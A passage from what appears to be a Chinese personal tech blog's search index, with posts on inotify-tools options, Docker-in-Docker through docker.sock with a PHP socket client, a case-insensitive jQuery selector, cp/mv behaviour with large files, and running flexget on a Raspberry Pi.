指定一次，不會輸出詳細信息，指定二次，除了致命錯誤，不會輸出任何信息。\n> –exclude\n> 正則匹配需要排除的文件，大小寫敏感。\n> –excludei\n> 正則匹配需要排除的文件，忽略大小寫。\n> -t , –timeout\n> 設置超時時間，如果為0，則無限期地執行下去。\n> -e , –event\n> 指定監視的事件。\n> -c, –csv\n> 輸出csv格式。\n> –timefmt\n> 指定時間格式，用於–format選項中的%T格式。\n> –format\n> 指定輸出格式。\n> %w 表示發生事件的目錄\n> %f 表示發生事件的文件\n> %e 表示發生的事件\n> %Xe 事件以「X」分隔\n> %T 使用由–timefmt定義的時間格式\n> inotifywatch\n> \n> 語法：\n> inotifywatch [-hvzrqf] [-e ] [-t ] [-a ] [-d ] [ … ]\n> 參數：\n> -h, –help\n> 輸出幫助信息\n> -v, –verbose\n> 輸出詳細信息\n> @\n> 排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。\n> –fromfile\n> 從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。\n> -z, –zero\n> 輸出表格的行和列，即使元素為空\n> –exclude\n> 正則匹配需要排除的文件，大小寫敏感。\n> –excludei\n> 正則匹配需要排除的文件，忽略大小寫。\n> -r, –recursive\n> 監視一個目錄下的所有子目錄。\n> -t , –timeout\n> 設置超時時間\n> -e , –event\n> 只監聽指定的事件。\n> -a , –ascending\n> 以指定事件升序排列。\n> -d , –descending\n> 以指定事件降序排列。\n\n|||\n|--- |--- |\n|access|文件讀取|\n|modify|文件更改。|\n|attrib|文件屬性更改，如權限，時間戳等。|\n|close_write|以可寫模式打開的文件被關閉，不代表此文件一定已經寫入數據。|\n|close_nowrite|以只讀模式打開的文件被關閉。|\n|close|文件被關閉，不管它是如何打開的。|\n|open|文件打開。|\n|moved_to|一個文件或目錄移動到監聽的目錄，即使是在同一目錄內移動，此事件也觸發。|\n|moved_from|一個文件或目錄移出監聽的目錄，即使是在同一目錄內移動，此事件也觸發。|\n|move|包括moved_to和 moved_from|\n|move_self|文件或目錄被移除，之後不再監聽此文件或目錄。|\n|create|文件或目錄創建|\n|delete|文件或目錄刪除|\n|delete_self|文件或目錄移除，之後不再監聽此文件或目錄|\n|unmount|文件系統取消掛載，之後不再監聽此文件系統。|\n\n\n資料來源: [inotify-tools使用方法介紹-Linux運維日誌](https://www.centos.bz/2012/06/inotify-tools-introduction/)\n\n## 相關 inotify 設定\n\n> 3、參數說明 \n> max_user_instances：每個用戶創建inotify實例最大值\n> max_queued_events：inotify隊列最大長度，如果值太小，會出現錯誤，導致監控文件不準確\n> max_user_watches：要知道同步的文件包含的目錄數，可以用：\n> [root@localhost]# find /home/rain -type d|wc -l 統計，必須保證參數值大於統計結果（/home/tan/uploadFile/為同步文件目錄）。\n\n查看設定\n\n```bash\nsysctl -a | grep max_queued_events  \n#fs.inotify.max_queued_events = 16384  \nsysctl -a | grep max_user_watches  \n#fs.inotify.max_user_watches = 8192  \n#fs.epoll.max_user_watches = 798863  \nsysctl -a | grep max_user_instances  \n#fs.inotify.max_user_instances = 128\n```\n\n> 五、修改inotify參數\n> \n> 1、命令修改\n> [root@localhost bin]# sysctl -w fs.inotify.max_user_instances=130  \n> fs.inotify.max_user_instances = 130\n> \n> 2、文件修改\n> [root@localhost]# vi /etc/sysctl.conf  \n> #添加如下代碼  \n> fs.inotify.max_user_instances=130\n\n資料來源: [CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記](http://www.1felse.com/blog/view.do?blogId=ff8080816102bdbb01610d45232d005a)\n\n\n\n## 相關串接方法\n\n\n* [rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky's Blog](https://jackyu.cn/tech/rsync-plus-inotify-tools/)\n監聽實作 rsync 方法\n\n* [PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客](https://blog.csdn.net/chunyuan314/article/details/81750211)\n發現 PHP 有擴充外掛可以使用\n\n* [inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園](https://www.cnblogs.com/spareribs/p/7722453.html)\n跟上面 PHP 不太一樣\n這邊他是用 inotify 寫入 log 方式去做比較是否異動\n\n* [Rsync+Inotify 搭建實時同步數據 ‧ Jusene's Blog](https://jusene.github.io/2017/02/18/rsync-inotify/)\n* [數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec](https://www.devopssec.cn/2018/08/23/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7-RSYNC%E7%BB%93%E5%90%88INOTIFY-TOOLS%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/)\n覺得這兩篇也寫得不錯\n\n## 小小實驗\n\n[cp 複製檔案可能沒注意的事情 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/)\n實驗一下複製大檔案當下狀況\n是忽看到 CLOSE_WRITE 做複製動作會比較安全\n\n看了一下\n-e close_write,delete,create,attrib\n-e close_write,delete,moved_to\n我看其他篇文章有下這個\n這樣真的用 close_write 比較安全\n\n```\n/home/vagrant/vv/ CREATE file.txt\n/home/vagrant/vv/ OPEN file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n...\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ MODIFY file.txt\n/home/vagrant/vv/ CLOSE_WRITE,CLOSE file.txt\n```\n\n## 總結\n\n我本來想找找網路上有沒有搭配 inotify-tools 做 RabbitMQ 動作\n是有找到 [sof-object-listing/inotify at master · prashanthpai/sof-object-listing](https://github.com/prashanthpai/sof-object-listing/tree/master/inotify)，但未確認是不是能真的用\n大多是做 **Web 監聽檔案** 和 **資料同步** 居多\n但是 inotify-tools 看起來也有接收大量打案也有極限\n不知道是不是一個好的解決方式\n也要看其況\n\n## 相關連結\n\n* [inotify-tools使用方法介紹-Linux運維日誌](https://www.centos.bz/2012/06/inotify-tools-introduction/) {% asset_link web1.png 備份圖 %}\n* [CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記](http://www.1felse.com/blog/view.do?blogId=ff8080816102bdbb01610d45232d005a) {% asset_link web2.png 備份圖 %}\n* [rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky's Blog](https://jackyu.cn/tech/rsync-plus-inotify-tools/) {% asset_link web3.png 備份圖 %}\n* [安全组应用案例_安全组_安全_云服务器 ECS-阿里云](https://help.aliyun.com/document_detail/25475.html?spm=5176.2020520101.121.1.211d5c9aAGX8X2#allowHttp) {% asset_link web4.png 備份圖 %}\n* [PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客](https://blog.csdn.net/chunyuan314/article/details/81750211)\n* [inotifywait命令_Linux inotifywait 命令用法詳解：異步文件系統監控機制](https://man.linuxde.net/inotifywait)\n* [inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園](https://www.cnblogs.com/spareribs/p/7722453.html) {% asset_link web5.png 備份圖 %}\n* [Rsync+Inotify 搭建實時同步數據 ‧ Jusene's Blog](https://jusene.github.io/2017/02/18/rsync-inotify/) {% asset_link web6.png 備份圖 %}\n* [數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec](https://www.devopssec.cn/2018/08/23/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7-RSYNC%E7%BB%93%E5%90%88INOTIFY-TOOLS%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/) {% asset_link web7.png 備份圖 %}\n\n\n\n\n\n\n\n\n\n**彩蛋**\n突然想到上次研究 Oauth API\n發現有些token 能做到時效性\n但一直沒有時間紀錄\n看到有一篇說 token 時效性問題\n突然想到這樣不就會買台時間不一樣的問題\n但後來發現原來 oauth 傳的時間是 duration 時間\n所以不會有這個問題\n* [開發者必備知識 - HTTP認證（HTTP Authentication） - Carson's Tech Note](https://carsonwah.github.io/http-authentication.html)\n* [thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server](https://github.com/thephpleague/oauth2-server)\n* [揭秘Token的工作原理 | Crazy's Blog](https://yhv5.com/token_1532.html?)\n* [微服務架構 #4, 如何強化微服務的安全性? API Token / JWT 的應用 — 安德魯的部落格](https://columns.chicken-house.net/2016/12/01/microservice7-apitoken/) {% asset_link web8.png 備份圖 %}\n* [Token 认证的来龙去脉 - 掘金](https://juejin.im/post/5a6c60166fb9a01caf37a5e5)\n* [iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/m/articles/10015681)\n* [RSA數位簽章的簡單流程 | Litfal的S/L中心 - 點部落](https://dotblogs.com.tw/litfal/2014/03/08/144298)\n* [[PHP] 範例實做 RSA, 公鑰、私鑰非對稱加密、解密演算法 - 串接 iOS,Android - 工作玩樂實驗室](https://cola.workxplay.net/encrypt-and-decrypt-data-in-php-using-rsa-example/)\n* [OAuth2 認證機制 Token 原理 - 科技新人](https://www.vnewin.com/day18-laravel-passport-oauth2-token/)\n* [非对称加密RSA详解 | Wuman's Blog](https://wumansgy.github.io/2018/11/03/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86RSA%E8%AF%A6%E8%A7%A3/)\n* [rsync異地增量備份　資料同步無落差 | 網管人](http://www.netadmin.com.tw/netadmin/zh-tw/technology/4596B5843A394A6C88C4C91BC1767667?page=4)\n* [Script - 使用 inotifywait 監控資料夾並上傳到s3 .sh](https://gist.github.com/lazyjerry/81c3a9e9ffc01e3a35d0ecd4a6f31e97)\n* [sysboss/inotify_s3: Bash: Inotify files sync to Amazon S3 Cloud](https://github.com/sysboss/inotify_s3)","tags":["linux"],"categories":["實用工具"]},{"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","url":"%2Fblog%2F2020%2F01%2F12%2FDocker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98%2F","content":"\n最近做大量資料處理\n我想使用 RabbitMQ 處理大量資料\n不過這個方式 RabbitMQ 會遇到 Work 需要一開始常駐\n不能做到自動調整控制 Work 數量\n所已採用 DinD 觀念去實作\n\n<!--more-->\n\nDIND 就是 Docker in Docker\n```bash\ndocker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:latest version\n```\n\n然後容器裡面的 Container 可以跟 docker.sock 做溝通\n相關可以控制方法 (Docker )\n\n* [Examples using the Docker Engine SDKs and Docker API | Docker Documentation](https://docs.docker.com/develop/sdk/examples/)\n* [关于/var/run/docker.sock | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现](https://blog.fundebug.com/2017/04/17/about-docker-sock/)\n\n更多 Unix-socket 方式可以參考\n[Engine API v1.24 | Docker Documentation](https://docs.docker.com/engine/api/v1.24/)\n[Docker Engine API v1.40 Reference](https://docs.docker.com/engine/api/v1.40/)\n\n看到這個方式突然想到之前 COSCUP 有看到 Serverless 方式去做\n\n* [Philipz Docker Lab. - Serverless 架構 & Docker](https://philipz.github.io/serverless.html)\n* [Building serverless apps with Docker - Docker Blog](https://www.docker.com/blog/building-serverless-apps-with-docker/)\n* [無伺服器架構 - 壹讀](https://read01.com/RRQMLQ.html)\n* [bfirsh/serverless-docker: Build serverless apps with Docker](https://github.com/bfirsh/serverless-docker)\n* [bfirsh/serverless-docker-voting-app: A serverless web app built with Docker](https://github.com/bfirsh/serverless-docker-voting-app)\n* [技术|用 Docker 创建 serverless 应用](https://linux.cn/article-7525-1.html)\n\n但由於要限制 docker 執行數量\n可以使用 Redis 用程式邏輯限制數量\n不過要如何實作，這篇不是重點\n\n\n### php 使用 socket 方式連 docker\n\n參考官網文章\n* [PHP: stream_socket_client - Manual](https://www.php.net/manual/en/function.stream-socket-client.php)\n* [Examples using the Docker Engine SDKs and Docker API | Docker Documentation](https://docs.docker.com/develop/sdk/examples/)\n\n```bash\ncurl --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\\n  -d '{\"Image\": \"alpine\", \"Cmd\": [\"echo\", \"hello world\"]}' \\\n  -X POST http:/v1.24/containers/create\n```\n\n發現 curl 需要 7.4 以上才有 unix-socket 連結功能\n但使用 php curl 沒有這個問題\n\n可以看到以下參考\n使用前請記得 `docker pull alpine`\n\n```php\n<?php\n$file_p = stream_socket_client(\"unix:///var/run/docker.sock\", $errno, $errstr, 30);\nif (!$file_p) {\n    echo \"$errstr ($errno)<br />\\n\";\n} else {\n    fwrite($file_p, \"POST /containers/create HTTP/1.1\\nHost: v1.24\\nContent-Type: application/json\\nContent-Length: 51\\nConnection: Close\\n\\n{\\\"Image\\\": \\\"alpine\\\", \\\"Cmd\\\": [\\\"echo\\\", \\\"hello world\\\"]}\");\n    while (!feof($file_p)) {\n        echo fgets($file_p, 1024);\n    }\n    fclose($file_p);\n}\n?>\n```\n\n`Connection: Close` 需要加，否則程式不會退出!!\n仔細想想這樣也滿有道理，需要切斷 socket 連線\nContent-Length 需要注意`{\"Image\": \"alpine\", \"Cmd\": [\"echo\", \"hello world\"]}`這個長度\n不對的話會有問題\n\n最後，程式用 DinD 要如何傳值到程式裡面，這也是一個不錯思考問題\n畢竟會遇到跳脫字元(\\\\)，可能使用外部資源(file,mysql,redis)會是比較安全方式\n\n* [如何用Telnet POST資料](http://blog.kenyang.net/2011/12/12/telnet-post)\n\n對外 socket 連結可以改成 tcp 開頭\n\n誤打誤撞，發現這個好像不錯工具[就是要你懂Unix Socket 进行抓包解析 | plantegg](https://plantegg.github.io/2019/04/04/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--Unix-Socket%E6%8A%93%E5%8C%85/){% asset_link web2.png 備份圖 %}\n[就是要你懂网络监控--ss用法大全 | plantegg](https://plantegg.github.io/2019/10/12/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7--ss%E7%94%A8%E6%B3%95%E5%A4%A7%E5%85%A8/)\n[就是要你懂抓包--WireShark之命令行版tshark | plantegg](https://plantegg.github.io/2019/06/21/%E5%B0%B1%E6%98%AF%E8%A6%81%E4%BD%A0%E6%87%82%E6%8A%93%E5%8C%85--WireShark%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%89%88tshark/)\n\n## 衍生問題\n\n### RabbitMQ 的 worker 要如何關小保持關掉中程式可以正常結束\n\n這個問題，我沒有在網路上爬到。\n不過我自己想這個問題，在設計 worker 這條路應該要做到 `已經做過` 和 `尚未執行成功` 中斷程式\n下次執行也能應該也要正常執行才對\n\n\n## RabbitMQ 連續大量錯誤\n\n[如何優雅地在RabbitMQ實現失敗重試 - lala - Medium](https://medium.com/@lalayueh/%E5%A6%82%E4%BD%95%E5%84%AA%E9%9B%85%E5%9C%B0%E5%9C%A8rabbitmq%E5%AF%A6%E7%8F%BE%E5%A4%B1%E6%95%97%E9%87%8D%E8%A9%A6-c050efd72cdb)  {% asset_link web1.png 備份圖 %}\n[.net - How do I set a number of retry attempts in RabbitMQ? - Stack Overflow](https://stackoverflow.com/questions/23158310/how-do-i-set-a-number-of-retry-attempts-in-rabbitmq)\n其他問題想到再說\n\n## rabbitmq 持久化\n\n有 Queue 持久化\n有 Message 持久化\n\n## rabbitmq 定義 Queue 不能修改\n\n## autoack 與 max-\n\n可能要確定 autoack = true 時候， server 馬上發送 message 給 worker ??\n\n[前言 · 轻松搞定RabbitMQ · 看云](https://www.kancloud.cn/longxuan/rabbitmq-arron/107717)\n\n[Auto-Scaling Services Using Instrumented Metrics - Docker Flow Monitor](https://monitor.dockerflow.com/auto-scaling/)\n\n\n[Spring Boot RabbitMQ - priority queue](https://programming.vip/docs/spring-boot-rabbitmq-priority-queue.html)","tags":["rabbitmq"],"categories":["Docker"]},{"title":"jQuery contains 可以抓大小寫的方法","url":"%2Fblog%2F2020%2F01%2F11%2FjQuery-contains-%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%A4%A7%E5%B0%8F%E5%AF%AB%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n最近做單頁篩選某欄位資料\n使用 jQuery contains selector 可以簡單實作\n但發現 contains 沒法搜尋到大小寫不同的單字\n就爬了一下 Google 紀錄一下\n\n\n<!--more-->\n\n參考如下方法\n* [Make jQuery :contains Case-Insensitive | CSS-Tricks](https://css-tricks.com/snippets/jquery/make-jquery-contains-case-insensitive/)\n* [jquery :contains case-Insensitive - JSFiddle](https://jsfiddle.net/bipen/dyfRa/)\n\n\n```js\n$.extend($.expr[\":\"], {\n\"containsIN\": function(elem, i, match, array) {\nreturn (elem.textContent || elem.innerText || \"\").toLowerCase().indexOf((match[3] || \"\").toLowerCase()) >= 0;\n}\n});\n\n```\n\n可以用`$('td:containsIN(\"'+value+'\")')` 抓到你要的資料\n非常簡單","tags":["jquery"],"categories":["JavaScript"]},{"title":"cp 複製檔案可能沒注意的事情","url":"%2Fblog%2F2020%2F01%2F10%2Fcp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n最近由於程式做很多檔案處理\n就在想 cp 到目的資料夾裡面 ls 是否能看到資料\n不過原本猜應該不會\n但實驗結果卻不是我想得這樣\n最後感覺我們被 GUI 介面受很多影響\n~~其實是無聊探討一些不重要的事情(哈哈)~~\n\n<!--more-->\n\n## 產生大檔案\n\n由於我用 PI 效能較差的電腦產生大檔案\n```bash\ndd if=/dev/zero of=file.txt count=1024 bs=1024    # 產生 1MB\ndd if=/dev/zero of=file.txt count=1024000 bs=1024 # 產生 1G\n```\n參考: [How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks](https://skorks.com/2010/03/how-to-quickly-generate-a-large-file-on-the-command-line-with-linux/)\n\n## 簡單測試\n\n其實就是把大檔案複製到別的資料夾\n\n這邊先說正常**沒中斷**複製檔案中\n目的資料夾檔案可以`ls`出來!!!\n在想處理中檔案是否有別的方法隱藏\n[scp - Is there a way to tell if a file is done copying? - Super User](https://superuser.com/questions/45224/is-there-a-way-to-tell-if-a-file-is-done-copying)\n有找到更好方式在做紀錄\n\n1. 有趣結論 1\n不過，我 `Ctrl+C` 竟然還會存在\n這有點出乎我的意料\n平常我們用 Window 桌面(不管是不是Linux)複製中檔案案取消都目的資料夾檔案一定會不見!!!\n\n2. 有趣結論 2\n不管事做`kill -9`或`kill -1`都是不會刪除...\n\n3. 有趣結論 3\ncp 檔案中...在別的 command line 做刪除動作\n竟然 cp command line 指令不會中斷跳出錯誤...\n\n但我想這種種跡象跟 Linux 檔案系統有關係\n回想過去我們傳 FTP 跟 轉影音檔到一半中斷\n我們檔案並不會刪除\n我們在 Window 複製檔案中，我們 GUI 介面可以看到檔案圖示\n但按取消後，圖示會跟著刪除\n這我想是作業系統有幫我們做刪除動作\n\n\n## 最後 mv\n\n我在想 mv 應該也是類似這樣\n~~cp 完到別的地方，會做刪除動作~~馬上打臉\n答案是錯的，同一個 HD 會很快(這應該跟作業系統有關係)\n\n但不同 HD 跟我 cp 實驗一模一樣!!!\n中斷會留檔案\n至於 window 系統我就不研究了\n\n~~又研究沒什麼軟用的實驗了~~\n\n\n不相關彩蛋\n預計 jQuery 和 inotify-tools 和 DinD(Docker in Docker) & RabbitMQ 要記錄...(我還記得的話之後會寫...怕忘記)\n* [Examples using the Docker Engine SDKs and Docker API | Docker Documentation](https://docs.docker.com/develop/sdk/examples/)\n* [[docker]privileged参数_docker,privileged_追寻神迹-CSDN博客](https://blog.csdn.net/halcyonbaby/article/details/43499409)\n* [Make jQuery :contains Case-Insensitive | CSS-Tricks](https://css-tricks.com/snippets/jquery/make-jquery-contains-case-insensitive/)\n* [jquery :contains case-Insensitive - JSFiddle](https://jsfiddle.net/bipen/dyfRa/)\n* [inotify-tools使用方法介绍-Linux运维日志](https://www.centos.bz/2012/06/inotify-tools-introduction/)\n* [CentOS 6.9上inotify-tools 安装及使用方法-Linux运维日志](https://www.centos.bz/2018/01/centos-6-9%E4%B8%8Ainotify-tools-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/)\n* [rsync + inotify-tools 实现 Linux 文件双向实时同步 – Jacky's Blog](https://jackyu.cn/tech/rsync-plus-inotify-tools/)\n* [PHP用inotify扩展监控文件_chunyuan314的博客-CSDN博客](https://blog.csdn.net/chunyuan314/article/details/81750211)\n* [inotifywait命令_Linux inotifywait 命令用法详解：异步文件系统监控机制](https://man.linuxde.net/inotifywait)\n* [Redis 阻塞、安全队列 BLPOP/BRPOPLPUSH - Silverd](http://silverd.cn/2015/07/06/blpop.html)\n* [How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks](https://skorks.com/2010/03/how-to-quickly-generate-a-large-file-on-the-command-line-with-linux/)\n* [inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒 - 黄小涛 - 博客园](https://www.cnblogs.com/spareribs/p/7722453.html)\n* [ktbyers/netmiko: Multi-vendor library to simplify Paramiko SSH connections to network devices](https://github.com/ktbyers/netmiko)\n* [python獲取程式執行檔案路徑方法 - IT閱讀](https://www.itread01.com/content/1546932986.html)","tags":["cp"],"categories":["Linux"]},{"title":"Raspberry Pi 使用 Docker 架設 flexget","url":"%2Fblog%2F2020%2F01%2F08%2FRaspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget%2F","content":"\n之前 PI 1號機裝 [HypriotOS: Back Again and Better then Ever · Docker Pirates ARMed with explosive stuff](https://blog.hypriot.com/post/hypriotos-back-again-with-docker-on-arm/)\n內建 Docker 不需要手動安裝\n相關教學可以看\n\n* [如何在 Raspberry Pi 上安裝 Docker CE | IT 技術家](http://blog.itist.tw/2017/06/how-to-install-docker-ce-with-raspbian-jessie.html)\n* [在 Raspberry Pi 2 運行 Docker](https://openhome.cc/Gossip/CodeData/DockerLayman/DockerLayman2.html)\n\n<!--more-->\n\n## 相關 arm Image 選擇\n\n相關尋找來源可以看[armhf's Profile - Docker Hub](https://hub.docker.com/u/armhf/)\n後來注意到**DEPRECATED**\n裡面有建議從 [arm32v7](https://hub.docker.com/u/arm32v7/) 和 [arm32v6](https://hub.docker.com/u/arm32v6/) 去找\n發現 arm32v7 我的 PI 1 不能用， PI 1 要使用 arm32v6 \n\n\n## 安裝 flexget\n\n目前測試網路上的 [breneser/flexget-arm: docker container for running flexget](https://github.com/breneser/flexget-arm)\n可以順利安裝\n\n### 安裝 flexget 最新版方法\n\n其實把 image 換成 Python3 image 重新 build 就可以了\n\n```dockerfile\nFROM arm32v6/python:3.8.1-alpine3.10\nMAINTAINER bren\n\nRUN apk add --update \\\n  tzdata \\\n  python \\\n  py-pip \\\n  ca-certificates \\\n  && pip install --no-cache-dir --disable-pip-version-check flexget transmissionrpc \\\n  && rm -rf /var/cache/apk/*\n\n# Copy local files\nCOPY files/ /\n\n# add default volumes\nVOLUME /config /data\nWORKDIR /config\n\n# expose port for flexget webui\nEXPOSE 3539 3539/tcp\n\n# run init.sh to set uid, gid, permissions and to launch flexget\nRUN chmod +x /scripts/init.sh\nCMD [\"/scripts/init.sh\"]\n\n```\n\n相關版本可以從[arm32v6/python - Docker Hub](https://hub.docker.com/r/arm32v6/python/) Tag上去挑版本\n[arm32v6/python Tags - Docker Hub](https://hub.docker.com/r/arm32v6/python/tags)\n\n## alpine 開 bash 方法\n\n在 docker 內建沒有 bash\n\n在 dockerfile 裝\n```\nRUN apk add --update bash && rm -rf /var/cache/apk/*\n```\n\n參考https://github.com/smebberson/docker-alpine/issues/43#issuecomment-226970518\n\n\n## /usr/share/zoneinfo/xxxx: No such file or directory\n\ntzdata 安裝這個能解決 上敘述問題\n參考 [時間 · ubuntu 學習筆記](https://kejyuntw.gitbooks.io/ubuntu-learning-notes/system/system-date.html)\n用 alpine 應該會遇到這個問題\n\n\n## 最後...\n\n最後發現 新版沒有 Config Editor\n所以默默裝回去\n有看到 [Config Editor](https://github.com/Flexget/webui/projects/3)\n看來好像還沒完成\n\n順便留一下版本紀錄\nVersion info\nFlexget: 2.21.35 \nAPI: 1.5.0\n\n## 其他沒相關的紀錄\n\n最近查有沒有監聽檔案新增方法，有找到 inotify-tool \n目前尚未整理，先貼到這邊...預防沒寫\n\n* [sof-object-listing/inotify at master · prashanthpai/sof-object-listing](https://github.com/prashanthpai/sof-object-listing/tree/master/inotify)\n* [inotify-tools使用方法介绍-Linux运维日志](https://www.centos.bz/2012/06/inotify-tools-introduction/)\n* [Ubuntu 若檔案這樣，就那樣的好物 inotify-tools » 記下來 - 專業偽筆記](https://noter.tw/26/ubuntu-%E8%8B%A5%E6%AA%94%E6%A1%88%E9%80%99%E6%A8%A3%EF%BC%8C%E5%B0%B1%E9%82%A3%E6%A8%A3%E7%9A%84%E5%A5%BD%E7%89%A9-inotify-tools/)\n* [inotify-tools工具inotifywatch实时监控网站目录_chaihongjun.me|柴宏俊web技术笔记](https://chaihongjun.me/os/linux/286.html)\n* [inotify-tools + php脚本实现Linux服务器文件监控并邮件提醒](https://article.itxueyuan.com/WA56x)\n\n\n相關未整理彩蛋\n\n* [arm32v6/python Tags - Docker Hub](https://hub.docker.com/r/arm32v6/python/tags)\n* [docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine](https://github.com/smebberson/docker-alpine/issues/43)\n* [ytt - YAML Templating Tool](https://get-ytt.io/#example:example-variable)\n* [FlexGet](https://flexget.com/Web-UI)\n* [Better Comments - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments)\n* [30 Seconds of Knowledge](moz-extension://55de8dc9-68eb-48ea-93fa-9d8190675ab1/newtab.html)\n* [从 PHP5.2 升级到 PHP7.1 遇到的函数参数问题 | Laravel China 社区](https://learnku.com/articles/9001/function-parameter-problems-encountered-by-upgrading-from-php52-to-php71)\n* [Incredibly slow upload speeds · Issue #798 · s3fs-fuse/s3fs-fuse](https://github.com/s3fs-fuse/s3fs-fuse/issues/798)\n* [amazon ec2 - S3fs performance improvements or alternative? - Server Fault](https://serverfault.com/questions/396100/s3fs-performance-improvements-or-alternative)\n* [amazon s3 - How can I mount an S3 bucket to an EC2 instance and write to it with PHP? - Stack Overflow](https://stackoverflow.com/questions/16428552/how-can-i-mount-an-s3-bucket-to-an-ec2-instance-and-write-to-it-with-php)\n* [使用 s3curl 访问 OpenStack Swift](https://lingxiankong.github.io/2017-07-28-s3curl-swift.html)\n* [spring - Uploading to Amazon S3 via curl route - Stack Overflow](https://stackoverflow.com/questions/44751574/uploading-to-amazon-s3-via-curl-route)\n* [deepsentry/aws-s3-curl: Upload a file to a S3 bucket](https://github.com/deepsentry/aws-s3-curl)\n* [redis消息队列简单应用 - 掘金](https://juejin.im/post/5cd0178151882542616c4a23)\n* [手码两万余字，SpringMVC 包教包会 - 江南一点雨 - 博客园](https://www.cnblogs.com/lenve/p/12100698.html)\n* [使用curl和wget发送post请求_cws1214的专栏-CSDN博客](https://blog.csdn.net/cws1214/article/details/21440691)\n* [年轻人的第一个OAuth2.0 Server-Hydra | 一只程序汪的自我修养 - 點部落](https://dotblogs.com.tw/liguobao/2018/12/30/132746)\n* [開發者必備知識 - HTTP認證（HTTP Authentication） - Carson's Tech Note](https://carsonwah.github.io/http-authentication.html)\n* [thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server](https://github.com/thephpleague/oauth2-server)\n* [schemalex/schemalex: Generate difference sql of two mysql schema](https://github.com/schemalex/schemalex)\n* [Basic performance testing · Issue #22 · GoogleCloudPlatform/gcsfuse](https://github.com/GoogleCloudPlatform/gcsfuse/issues/22)\n* [Laravel 和 Spring Boot 兩個 框架 比較創業篇（ 一： 開發效率） - 好文 - 码工具](http://www.matools.com/lang-cht/blog/190383692)\n* [Portainer 透過 TLS 認證 - Yi Yang's Blog](https://yylin1.github.io/2019/01/28/portainer-set-tls/)\n* [時間 · ubuntu 學習筆記](https://kejyuntw.gitbooks.io/ubuntu-learning-notes/system/system-date.html)\n* [docker-alpine redis how to get into bash · Issue #43 · smebberson/docker-alpine](https://github.com/smebberson/docker-alpine/issues/43)","tags":["flexget"],"categories":["Linux"]},{"title":"快速產生資料表 alter table 語法 schemalex","url":"%2Fblog%2F2020%2F01%2F02%2F%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex%2F","content":"\n常常我們在測試 DB 環境\n不會馬上上到正式環境\n但都是分開改 alter table\n之前有在 Dbeaver 有 migrate table 功能\n但大致上我們工程師沒有 DB 的權限\n要如何快速產生 alter table 語法呢?\n\n<!--more-->\n\n其實之前有寫過 